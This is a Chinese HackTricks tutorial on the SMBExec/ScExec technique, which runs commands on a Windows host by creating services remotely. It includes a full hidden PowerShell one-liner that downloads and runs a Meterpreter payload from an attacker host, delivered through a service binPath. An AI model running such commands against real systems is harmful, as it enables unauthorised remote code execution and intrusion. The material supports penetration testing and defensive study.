# SmbExec/ScExec

<details>

<summary><strong>从零到英雄学习AWS黑客攻击</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**telegram群组**](https://t.me/peass)或在**Twitter**上**关注**我 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## 它是如何工作的

**Smbexec的工作原理类似于Psexec。** 在这个例子中，我们**不是**将 "_binpath_" 指向受害者内部的恶意可执行文件，而是将其**指向** **cmd.exe或powershell.exe**，它们中的一个将下载并执行后门程序。

## **SMBExec**

让我们看看smbexec运行时发生了什么，从攻击者和目标的角度来看：

![](../../.gitbook/assets/smbexec\_prompt.png)

所以我们知道它创建了一个服务"BTOBTO"。但是当我们执行`sc query`时，目标机器上并没有这个服务。系统日志透露了发生了什么：

![](../../.gitbook/assets/smbexec\_service.png)

服务文件名包含一个要执行的命令字符串（%COMSPEC% 指向cmd.exe的绝对路径）。它将要执行的命令回显到一个bat文件中，将stdout和stderr重定向到一个临时文件，然后执行bat文件并删除它。回到Kali，Python脚本通过SMB拉取输出文件，并在我们的"伪shell"中显示内容。我们在"shell"中输入的每个命令，都会创建一个新服务并重复该过程。这就是为什么它不需要放置一个二进制文件，它只是将每个想要执行的命令作为一个新服务执行。绝对更隐蔽，但正如我们所见，每执行一个命令就会创建一个事件日志。尽管如此，这仍然是一个非常聪明的方式来获得一个非交互式的"shell"！

## 手动SMBExec

**或者通过服务执行命令**

正如smbexec所演示的，可以直接从服务binPaths执行命令，而不需要二进制文件。如果您需要在目标Windows机器上执行一个任意命令，这可以是一个有用的技巧。作为一个快速示例，让我们使用远程服务获取一个Meterpreter shell，_不需要_二进制文件。

我们将使用Metasploit的`web_delivery`模块，并选择一个PowerShell目标，带有反向Meterpreter有效载荷。监听器已设置，并告诉我们在目标机器上执行的命令：
```
powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n');
```
从我们的Windows攻击盒子中，我们创建一个远程服务（"metpsh"），并设置binPath来执行cmd.exe并运行我们的有效载荷：

![](../../.gitbook/assets/sc\_psh\_create.png)

然后启动它：

![](../../.gitbook/assets/sc\_psh\_start.png)

它报错了，因为我们的服务没有响应，但如果我们查看我们的Metasploit监听器，我们会看到回调已经发生并且有效载荷已经执行。

所有信息都是从这里提取的：[https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

<details>

<summary><strong>从零开始学习AWS黑客攻击直到成为专家，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

其他支持HackTricks的方式：

* 如果你想在**HackTricks中看到你的公司广告**或者**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFT系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来**分享你的黑客技巧**。

</details>
